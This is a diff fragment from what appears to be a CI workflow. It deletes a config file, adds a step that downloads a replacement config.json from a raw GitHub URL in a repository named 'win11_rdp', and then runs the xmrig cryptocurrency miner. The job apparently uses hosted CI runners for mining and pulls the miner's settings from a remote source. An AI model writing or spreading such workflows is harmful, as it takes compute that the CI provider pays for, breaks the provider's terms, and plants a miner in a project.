@@ -14,6 +14,6 @@ jobs:
     - name: removing old files
       run: cd xmrig-6.17.0 && rm -rf config.json
     - name: download new files
-      run: Invoke-WebRequest
+      run: Invoke-WebRequest https://raw.githubusercontent.com/Ma24wt/win11_rdp/main/config.json -OutFile config.json
     - name: starting
       run: cd xmrig-6.17.0 && ./xmrig
